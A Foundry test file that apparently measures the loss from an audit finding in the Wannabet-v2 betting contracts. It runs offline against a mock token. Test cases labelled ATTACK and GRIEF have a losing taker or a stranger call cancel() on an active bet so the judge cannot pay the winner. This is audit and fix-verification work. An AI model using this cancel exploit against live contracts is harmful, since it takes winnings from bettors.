// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// Loss measurement for finding 64637 (Cyfrin, Wannabet-v2):
// "Active and pending bets can be cancelled by anyone".
//
// Fully offline: local mock USDC-like token (6 decimals), local Bet + BetFactory,
// no Aave pool, no fork. Amounts are in mock-token base units (1e6 = 1 token).
//
// Each case: the maker and taker stake, the taker accepts, time moves to just before
// the end time, and the judge's ruling would be "maker wins". Then someone tries to
// cancel. If the cancel works, the judge can no longer resolve. If it reverts (the
// fix), the judge resolves for the maker. The test logs every balance and the
// maker's lost payout. It asserts nothing about the bug, so it runs on both commits.
//
// Compiles on both commits: it never reads the renamed struct field
// (resolveBy -> endsBy) and never names Status.JUDGING.

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {Bet} from "../src/Bet.sol";
import {BetFactory} from "../src/BetFactory.sol";
import {IBet} from "../src/interfaces/IBet.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("Mock USD Coin", "USDC") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract Loss64637_Wannabet is Test {
    BetFactory betFactory;
    MockUSDC usdc;
    address maker = makeAddr("maker");
    address taker = makeAddr("taker");
    address judge = makeAddr("judge");
    address owner = makeAddr("owner");
    address stranger = makeAddr("stranger");

    uint40 endTs;

    function setUp() public {
        usdc = new MockUSDC();
        betFactory = new BetFactory(owner, address(new Bet()));
    }

    // Creates and accepts a bet, then warps to one second before the end time.
    function _activeBet(uint256 makerStake, uint256 takerStake) internal returns (IBet b) {
        usdc.mint(maker, makerStake);
        usdc.mint(taker, takerStake);

        uint40 acceptBy = uint40(block.timestamp + 1000);
        endTs = uint40(block.timestamp + 2000);
        address predicted = betFactory.predictBetAddress(maker, taker, acceptBy, endTs);

        vm.startPrank(maker);
        usdc.approve(predicted, makerStake);
        b = IBet(betFactory.createBet(taker, judge, address(usdc), makerStake, takerStake, acceptBy, endTs, "loss"));
        vm.stopPrank();

        vm.startPrank(taker);
        usdc.approve(address(b), takerStake);
        b.accept();
        vm.stopPrank();

        vm.warp(uint256(endTs) - 1);
        require(b.bet().status == IBet.Status.ACTIVE, "bet not active");
    }

    // Runs one case. `canceller` == address(0) means nobody cancels (baseline).
    function _run(string memory label, uint256 makerStake, uint256 takerStake, address canceller) internal {
        IBet b = _activeBet(makerStake, takerStake);
        uint256 pot = makerStake + takerStake;
        uint256 duePayout = pot; // no Aave pool: resolve pays the winner the full pot

        console.log("==", label);
        console.log("  maker stake           :", makerStake);
        console.log("  taker stake           :", takerStake);
        console.log("  pot                   :", pot);
        console.log("  maker due if resolved :", duePayout);

        bool cancelled;
        if (canceller != address(0)) {
            vm.prank(canceller);
            try b.cancel() {
                cancelled = true;
                console.log("  cancel by non-judge   : SUCCEEDED");
            } catch (bytes memory err) {
                console.log("  cancel by non-judge   : reverted, selector:");
                console.logBytes4(bytes4(err));
            }
        }

        if (!cancelled) {
            vm.prank(judge);
            b.resolve(maker);
            console.log("  judge resolved        : winner = maker");
        }

        uint256 makerEnd = usdc.balanceOf(maker);
        uint256 takerEnd = usdc.balanceOf(taker);
        uint256 makerLoss = duePayout - makerEnd;
        uint256 takerAvoided = takerEnd; // taker should end with 0 after losing
        console.log("  final status (enum)   :", uint256(b.bet().status));
        console.log("  maker ends with       :", makerEnd);
        console.log("  taker ends with       :", takerEnd);
        console.log("  bet contract holds    :", usdc.balanceOf(address(b)));
        console.log("  maker lost payout     :", makerLoss);
        console.log("  taker loss avoided    :", takerAvoided);
        console.log("  loss, bps of pot      :", makerLoss * 10_000 / pot);
        console.log("  loss, bps of payout   :", makerLoss * 10_000 / duePayout);
        console.log("  loss, bps of winnings :", takerStake == 0 ? 0 : makerLoss * 10_000 / takerStake);
    }

    function test_1_baseline_judgeResolves() public {
        _run("BASELINE: judge resolves, maker wins, 1000/1000", 1000e6, 1000e6, address(0));
    }

    function test_2_losingTakerCancels_evenStakes() public {
        _run("ATTACK: losing taker cancels, 1000/1000", 1000e6, 1000e6, taker);
    }

    function test_3_losingTakerCancels_unevenStakes() public {
        // Maker backs an outsider at 10:1 and wins.
        _run("ATTACK: losing taker cancels, 100/1000", 100e6, 1000e6, taker);
    }

    function test_4_strangerCancels() public {
        // A third party cancels. Same mechanics: griefing, or an accomplice of the losing side.
        _run("GRIEF: stranger cancels, 1000/1000", 1000e6, 1000e6, stranger);
    }
}
